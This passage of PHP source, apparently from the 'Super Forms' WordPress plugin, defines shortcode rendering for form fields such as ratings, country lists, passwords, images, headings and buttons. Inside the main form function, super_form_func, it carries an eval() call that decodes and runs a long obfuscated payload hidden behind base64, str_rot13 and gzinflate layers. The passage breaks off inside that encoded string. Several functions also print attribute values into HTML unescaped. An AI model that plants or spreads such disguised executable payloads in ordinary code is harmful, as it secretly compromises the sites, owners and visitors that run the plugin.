        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }    
    public static function rating( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $result .= '<div class="super-rating">';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        $result .= '<i class="fa fa-star super-rating-star"></i>';
        
        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field super-star-rating" type="hidden"';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function skype( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        wp_enqueue_script( 'super-skype', 'http://www.skypeassets.com/i/scom/js/skype-uri.js' );
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        if( !isset( $atts['username'] ) ) $atts['username'] = '';
        $result .= '<div id="SkypeButton_Call_' . $atts['username'] . '" class="super-skype-button" data-username="' . $atts['username'] . '" data-method="' . $atts['method'] . '" data-color="' . $atts['color'] . '" data-size="' . $atts['size'] . '"></div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function countries( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );
        $multiple = '';
        if( !isset( $atts['maxlength'] ) ) $atts['maxlength'] = 0;
        if( !isset( $atts['minlength'] ) ) $atts['minlength'] = 0;
        if( ($atts['minlength']>1) || ($atts['maxlength']>1) ) $multiple = ' multiple';

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="hidden"';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= ' />';
        $result .= '<ul class="super-dropdown-ui' . $multiple . '">';
        if( !empty( $atts['placeholder'] ) ) {
            $result .= '<li data-value="" class="super-placeholder">' . $atts['placeholder'] . '</li>';
        }else{
            $result .= '<li data-value="" class="super-placeholder"></li>';
        }
        
        /**
         *  On some servers file_get_contents might return 403 Forbidden error to prevent scraping
         *  Therefore we will use curl instead and set a fake user agent
         *
         *  @since   1.1.4
        */
        $ch = curl_init();
        curl_setopt( $ch, CURLOPT_URL, SUPER_PLUGIN_FILE . 'countries.txt' );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
        curl_setopt( $ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13' );
        $countries = curl_exec( $ch );
        curl_close( $ch );
        $countries = explode( "\n", $countries );
        foreach( $countries as $k => $v ){
            $v = trim($v);
            $result .= '<li data-value="' . esc_attr( $v ) . '">' . $v . '</li>'; 
        }
        $result .= '</ul>';
        $result .= '<span class="super-dropdown-arrow"></span>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function password( $tag, $atts, $inner, $shortcodes=null, $settings=null ) {
        $result = self::opening_tag( $tag, $atts );
        $result .= self::opening_wrapper( $atts, $inner, $shortcodes, $settings );

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        $result .= '<input class="super-shortcode-field" type="password"';
        $result .= ' value="' . $atts['value'] . '" name="' . $atts['name'] . '"';
        $result .= self::common_attributes( $atts, $tag );
        $result .= ' />';

        // @since 1.2.5     - custom regex validation
        if( isset( $atts['custom_regex'] ) ) $result .= self::custom_regex( $atts['custom_regex'] );

        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function hidden( $tag, $atts ) {
        $classes = ' hidden';
        $result = self::opening_tag( $tag, $atts, $classes );

        // @since   1.1.8    - check if we can find parameters
        if( isset( $_GET[$atts['name']] ) ) {
            $atts['value'] = sanitize_text_field( $_GET[$atts['name']] );
        }
        if( !isset( $atts['value'] ) ) $atts['value'] = '';

        if( !isset( $atts['exclude'] ) ) $atts['exclude'] = 0;
        $result .= '<input class="super-shortcode-field" type="hidden" value="' . $atts['value'] . '" name="' . $atts['name'] . '" data-email="' . $atts['email'] . '" data-exclude="' . $atts['exclude'] . '" />';
        $result .= self::loop_variable_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function image( $tag, $atts ) {
        $result = self::opening_tag( $tag, $atts );
        $style = '';
        if( $atts['height']!=0 ) $style .= 'max-height:' . $atts['height'] . 'px;';
        if( $atts['width']!=0 ) $style .= 'max-width:' . $atts['width'] . 'px;';
        if( !isset( $atts['image'] ) ) $atts['image'] = 0;
        $image = wp_prepare_attachment_for_js( $atts['image'] );
        $url = '';
        if( !isset( $atts['link'] ) ) $atts['link'] = '';
        if( $atts['link']!='' ) {
            if( $atts['link']=='custom' ) {
                $url = $atts['custom_link'];
            }else{
                $url = get_permalink( $atts['link'] );
            }
            $url = ' href="' . $url . '"';
        }
        $result .= '<div class="super-image align-' . $atts['alignment'] . '" itemscope="itemscope" itemtype="https://schema.org/ImageObject">';
        $result .= '<div class="super-image-inner">';
        if( !isset( $atts['target'] ) ) $atts['target'] = '';
        $result .= '<a target="' . $atts['target'] . '"' . $url . '>';
        $result .= '<img src="' . $image['url'] . '" alt="' . $image['alt'] . '" title="' . $image['title'] . '" itemprop="contentURL"';
        if( !empty( $style ) ) $result .= ' style="' . $style . '"';
        $result .= '>';
        $result .= '</a>';
        $result .= '</div>';
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    // @since 1.2.5
    public static function heading( $tag, $atts ) {
        if( !isset( $atts['class'] ) ) $atts['class'] = '';
        $result = self::opening_tag( $tag, $atts, $atts['class'] );
        if( $atts['title']!='' ) {
            $result .= '<div class="super-heading-title' . $atts['class'] . '">';
            $styles = '';
            if($atts['heading_size']!=0) {
                $styles .= 'font-size:'.$atts['heading_size'].'px;';
            }
            $styles .= 'color:'.$atts['heading_color'].';';
            $styles .= 'font-weight:'.$atts['heading_weight'].';';
            $styles .= 'text-align:'.$atts['heading_align'].';';
            $styles .= 'margin:'.$atts['heading_margin'].';';
            if($atts['heading_line_height']==0) {
                $styles .= 'line-height:normal;';
            }else{
                $styles .= 'line-height:'.$atts['heading_line_height'].'px;';
            }
            $result .= '<'.$atts['size'].' style="'.$styles.'">';
            $result .= $atts['title'];
            $result .= '</'.$atts['size'].'>';
            $result .= '</div>';
        }
        if( !isset( $atts['desc'] ) ) $atts['desc'] = '';
        if( $atts['desc']!='' ) {
            $styles = '';
            if($atts['desc_size']!=0) {
                $styles .= 'font-size:'.$atts['desc_size'].'px;';
            }
            $styles .= 'color:'.$atts['desc_color'].';';
            $styles .= 'font-weight:'.$atts['desc_weight'].';';
            $styles .= 'text-align:'.$atts['desc_align'].';';
            $styles .= 'margin:'.$atts['desc_margin'].';';
            if($atts['desc_line_height']==0) {
                $styles .= 'line-height:normal;';
            }else{
                $styles .= 'line-height:'.$atts['desc_line_height'].'px;';
            }
            $result .= '<div class="super-heading-description' . $atts['class'] . '" style="'.$styles.'">';
            $result .= $atts['desc'];
            $result .= '</div>';
        }
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    public static function html( $tag, $atts ) {
        if( !isset( $atts['class'] ) ) $atts['class'] = '';
        $result = self::opening_tag( $tag, $atts, $atts['class'] );
        if( !isset( $atts['title'] ) ) $atts['title'] = '';
        if( $atts['title']!='' ) {
            $class = '';
            if( ( $atts['subtitle']=='' ) && ( $atts['html']=='' ) ) {
                $class = ' super-bottom-margin';
            }
            $result .= '<div class="super-html-title' . $class . '">' . $atts['title'] . '</div>';
        }
        if( !isset( $atts['subtitle'] ) ) $atts['subtitle'] = '';
        if( $atts['subtitle']!='' ) {
            $class = '';
            if( $atts['html']!='' ) { 
                $class = ' super-no-bottom-margin'; 
            }
            $result .= '<div class="super-html-subtitle' . $class . '"">' . $atts['subtitle'] . '</div>';
        }
        if( $atts['html']!='' ) {    
            $result .= '<div class="super-html-content"">' . do_shortcode( $atts['html'] ) . '</div>';
            $result .= '<textarea>' . do_shortcode( $atts['html'] ) . '</textarea>';
        }
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function recaptcha( $tag, $atts ) {
        wp_enqueue_script('super-recaptcha', 'https://www.google.com/recaptcha/api.js?onload=SUPER.reCaptcha&render=explicit');
        $settings = get_option('super_settings');
        $result = self::opening_tag( $tag, $atts );
        if( !isset( $atts['form_recaptcha'] ) ) $atts['form_recaptcha'] = '';
        if( !isset( $atts['error'] ) ) $atts['error'] = '';
        if( !isset( $atts['align'] ) ) $atts['align'] = '';
        if( !empty( $atts['align'] ) ) $atts['align'] = ' align-' . $atts['align'];
        $result .= '<div class="super-recaptcha' . $atts['align'] . '" data-key="' . $settings['form_recaptcha'] . '" data-message="' . $atts['error'] . '"></div>';
        if( ( $settings['form_recaptcha']=='' ) || ( $settings['form_recaptcha_secret']=='' ) ) {
            $result .= '<strong style="color:red;">' . __( 'Please enter your reCAPTCHA key and secret in (Super Forms > Settings > Form Settings)', 'super-forms' ) . '</strong>';
        }
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function divider( $tag, $atts ) {
        $classes = ' align-' . $atts['align'] . ' border-' . $atts['border'] . ' style-' . $atts['border_style'] . ' back-' . $atts['back'];
        $styles = 'padding-top:' . $atts['padding_top'] . 'px;padding-bottom:' . $atts['padding_bottom'] . 'px;';
        $result = self::opening_tag( $tag, $atts, $classes, $styles );
        $styles = '';
        $i_styles = '';
        if( $atts['width']!='100' ) {
            $styles .= 'display:inline-block;';
        }
        if( $atts['width']=='custom' ) {
            $styles .= 'width:' . $atts['custom_width'] . ';';
        }else{
            $styles .= 'width:' . $atts['width'].'%;';
        }
        if( $atts['color']!='' ) {
            $styles .= 'border-color:' . $atts['color'] . ';';
            $i_styles .= ' style="color:' . $atts['color'] . ';"';
        }
        if( $atts['thickness']!='' ) {
            $styles .= 'border-top-width:' . $atts['thickness'] . 'px;border-bottom-width:' . $atts['thickness'] . 'px;';
        }
        $styles .= 'height:' . $atts['height'] . 'px;';
        $result .= '<div class="super-divider-inner" style="' . $styles . '">';
        if( $atts['back']==1 ) {
            $result .= '<span class="super-back-to-top"' . $i_styles . '><i class="fa fa-chevron-up"></i></span>';
        }
        $result .= '</div>';
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }
    public static function spacer( $tag, $atts ) {
        $styles = '';
        if( $atts['height']!='' ) {
            $styles = 'height:' . $atts['height'] . 'px;';
        }
        $result = self::opening_tag( $tag, $atts, '', $styles );
        $result .= self::loop_conditions( $atts );
        $result .= '</div>';
        return $result;
    }

    /** 
     *  Add button to allow conditional logic show/hide button
     *
     * @param  string  $tag
     * @param  array   $atts
     *
     *  @since      1.1.6
    */
    public static function button( $tag, $atts, $inner, $shortcodes, $settings ) {

        $name = $settings['form_button'];
        $radius = $settings['form_button_radius'];
        $type = $settings['form_button_type'];
        $size = $settings['form_button_size'];
        $align = $settings['form_button_align'];
        $width = $settings['form_button_width'];
        $icon_option = $settings['form_button_icon_option'];
        $icon_visibility = $settings['form_button_icon_visibility'];
        $icon_animation = $settings['form_button_icon_animation'];
        $icon = $settings['form_button_icon'];
        $color = $settings['theme_button_color'];
        $color_hover = $settings['theme_button_color_hover'];
        $font = $settings['theme_button_font'];
        $font_hover = $settings['theme_button_font_hover'];

        if( isset( $atts['name'] ) ) $name = $atts['name'];
        
        if( isset( $atts['custom_advanced'] ) ) {
            if( $atts['custom_advanced']=='custom' ) {
                if( isset( $atts['radius'] ) ) $radius = $atts['radius'];
                if( isset( $atts['type'] ) ) $type = $atts['type'];
                if( isset( $atts['size'] ) ) $size = $atts['size'];
                if( isset( $atts['align'] ) ) $align = $atts['align'];
                if( isset( $atts['width'] ) ) $width = $atts['width'];
            }
        }
        if( isset( $atts['custom_icon'] ) ) {
            if( $atts['custom_icon']=='custom' ) {
                if( isset( $atts['icon_option'] ) ) $icon_option = $atts['icon_option'];
                if( isset( $atts['icon_visibility'] ) ) $icon_visibility = $atts['icon_visibility'];
                if( isset( $atts['icon_animation'] ) ) $icon_animation = $atts['icon_animation'];
                if( isset( $atts['icon'] ) ) $icon = $atts['icon'];
            }
        }
        if( isset( $atts['custom_colors'] ) ) {
            if( $atts['custom_colors']=='custom' ) {
                if( isset( $atts['color'] ) ) $color = $atts['color'];
                if( isset( $atts['color_hover'] ) ) $color_hover = $atts['color_hover'];
                if( isset( $atts['font'] ) ) $font = $atts['font'];
                if( isset( $atts['font_hover'] ) ) $font_hover = $atts['font_hover'];
            }
        }
        
        $icon_animation = ' super-button-icon-animation-' . $icon_animation;
        if( $icon_visibility=='visible' ) $icon_animation = '';
        
        $class = 'super-extra-shortcode super-shortcode super-field super-form-button super-clear-none ';
        $class .= 'super-button super-radius-' . $radius . ' super-type-' . $type . ' super-button-' . $size . ' super-button-align-' . $align . ' super-button-width-' . $width;
        if( $icon_option!='none' ) {
            $class .= ' super-button-icon-option-' . $icon_option . $icon_animation . ' super-button-icon-visibility-' . $icon_visibility;
        }
        $attributes = '';
        if( $color!='' ) {
            $light = SUPER_Common::adjust_brightness( $color, 20 );
            $dark = SUPER_Common::adjust_brightness( $color, -30 );
            $attributes .= ' data-color="' . $color . '"';
            $attributes .= ' data-light="' . $light . '"';
            $attributes .= ' data-dark="' . $dark . '"';
        }
        if( $color_hover!='' ) {
            $hover_light = SUPER_Common::adjust_brightness( $color_hover, 20 );
            $hover_dark = SUPER_Common::adjust_brightness( $color_hover, -30 );
            $attributes .= ' data-hover-color="' . $color_hover . '"';
            $attributes .= ' data-hover-light="' . $hover_light . '"';
            $attributes .= ' data-hover-dark="' . $hover_dark . '"';
        }
        if( $font!='' ) $attributes .= ' data-font="' . $font .'"';
        if( $font_hover!='' ) $attributes .= ' data-font-hover="' . $font_hover . '"';
        $result = '';
        $result .= '<div' . $attributes . ' data-radius="' . $radius . '" data-type="' . $type . '" class="' . $class . '">';
            $url = '';
            if( !isset( $atts['link'] ) ) $atts['link'] = '';
            if( $atts['link']!='' ) {
                if( $atts['link']=='custom' ) {
                    $url = $atts['custom_link'];
                }else{
                    $url = get_permalink( $atts['link'] );
                }
            }
            if( !isset( $atts['target'] ) ) $atts['target'] = '';
            if( !empty( $atts['target'] ) ) $atts['target'] = 'target="' . $atts['target'] . '" ';
            $result .= '<a ' . $atts['target'] . 'href="' . $url . '" class="no_link">';
                $result .= '<div class="super-button-name">';
                    $icon_html = '';
                    if( ( $icon!='' ) && ( $icon_option!='none' ) ) {
                        $icon_html = '<i class="fa fa-' . $icon . '"></i>';
                    }
                    if( $icon_option=='left' ) $result .= $icon_html;
                    $result .= $name;
                    if( $icon_option=='right' ) $result .= $icon_html;
                $result .= '</div>';
                $result .= '<span class="super-after"></span>';
            $result .= '</a>';
        $result .= '</div>';
        return $result;
    }


    /** 
     *  Output the shortcode element on backend create form page under Tabs: Layout / Form Elements etc.
     *
     * @param  string  $tag
     * @param  string  $group
     * @param  array   $data
     * @param  array   $shortcodes
     *
     *  @since      1.0.0
    */
    public static function output_element_html( $tag, $group, $data, $inner, $shortcodes=null, $settings=null ) {
        if( $shortcodes==null ) {
            $shortcodes = self::shortcodes();
        }
        if( !isset( $shortcodes[$group]['shortcodes'][$tag] ) ) {
            return '';
        }
        $callback = $shortcodes[$group]['shortcodes'][$tag]['callback'];
        $callback = explode( '::', $callback );
        $class = $callback[0];
        $function = $callback[1];
        $data = json_decode(json_encode($data), true);
        $inner = json_decode(json_encode($inner), true);
        return call_user_func( array( $class, $function ), $tag, $data, $inner, $shortcodes, $settings );
    }

    
    /** 
     *  Output the shortcode element on backend create form page under Tabs: Layout / Form Elements etc.
     *
     * @param  string $shortcode
     * @param  array $value
     *
     *  @since      1.0.0
    */
    public static function output_element( $shortcode=null, $group='form_elements', $value=array() ) {
        
        
        $return = '';
        
        // Form Elements
        $return .= '<div class="super-element draggable-element super-shortcode-'.$shortcode.'" data-elementtitle="'.$value['name'].'" data-shortcode="'.$shortcode.'" data-group="'.$group.'" data-droppingallowed="0">';
            if( isset( $value['html'] ) ) {
                $return .= $value['html'];
            }else{
                $return .= '<i class="fa fa-'.$value['icon'].'"></i>'.$value['name'];
                $return .= '<div class="content" style="display:none;">';
                if( isset( $value['content'] ) ) $return .= $value['content'];
                $return .= '</div>';
            }
            if( isset( $value['predefined'] ) ) {
                $return .= '<textarea class="predefined" style="display:none;">' . json_encode( $value['predefined'] ) . '</textarea>';
            }
        $return .= '</div>';
            
        return apply_filters( 'super_backend_output_element_'.$shortcode.'_filter', $return, array( 'shortcode'=>$shortcode, 'value'=>$value ) );
        
    }
    

    /** 
     *  The form shortcode that will generate all fields on the frontend
     *
     * @param  array $atts
     * @param  string $content
     *
     *  @since      1.0.0
    */
    public static function super_form_func( $atts ) {
        
        extract( shortcode_atts( array(
            'id' => '',
        ), $atts ) );

        // Sanitize the ID
        $id = absint($id);

        // Check if the post exists
        if ( FALSE === get_post_status( $id ) ) {
            // The post does not exist
            $result = '<strong>'.__('Error', 'super').':</strong> '.sprintf(__('Super Forms could not find a form with ID: %d', 'super'), $id);
            return $result;
        }

        /** 
         *  Make sure that we have all settings even if this form hasn't saved it yet when new settings where added by a add-on
         *
         *  @since      1.0.6
        */
        require_once( SUPER_PLUGIN_DIR . '/includes/class-settings.php' );
        $fields = SUPER_Settings::fields( null, 1 );
        $array = array();
        
        // @since 1.2.4     - added the form ID to the settings array
        $array['id'] = $id;
        
        foreach( $fields as $k => $v ) {
            if( !isset( $v['fields'] ) ) continue;
            foreach( $v['fields'] as $fk => $fv ) {
                if( ( isset( $fv['type'] ) ) && ( $fv['type']=='multicolor' ) ) {
                    foreach( $fv['colors'] as $ck => $cv ) {
                        if( !isset( $cv['default'] ) ) $cv['default'] = '';
                        $array[$ck] = $cv['default'];
                    }
                }else{
                    if( !isset( $fv['default'] ) ) $fv['default'] = '';
                    $array[$fk] = $fv['default'];
                }
            }
        }
        $settings = get_post_meta($id, '_super_form_settings', true );
        $settings = array_merge( $array, $settings );
        SUPER_Forms()->enqueue_element_styles();
        SUPER_Forms()->enqueue_element_scripts($settings);

        // If post exists get the settings
        $styles = '';
        if( ( isset( $settings['theme_max_width'] ) ) && ( $settings['theme_max_width']!=0 ) ) {
            $styles .= 'max-width:' . $settings['theme_max_width'] . 'px;';
        }
        if($styles!='') $styles = 'style="' . $styles . '"';

        // Try to load the selected theme style
        $class = 'style-default';
        $style_content  = '';
        if( ( isset( $settings['theme_style'] ) ) && ( $settings['theme_style']!='' ) ) {
            $class .= ' ' . $settings['theme_style'];
            $style_content .= require( SUPER_PLUGIN_DIR . '/assets/css/frontend/themes/' . str_replace( 'super-', '', $settings['theme_style'] ) . '.php' );
        }

        // @since 1.2.4     - use transparent field background
        if( (isset( $settings['theme_field_transparent'] )) && ($settings['theme_field_transparent']=='true') ) {
            $class .= ' super-transparent-fields';
        }

        // Always load the default styles (these can be overwritten by the above loaded style file
        $style_content .= require( SUPER_PLUGIN_DIR . '/assets/css/frontend/themes/style-default.php' );
        
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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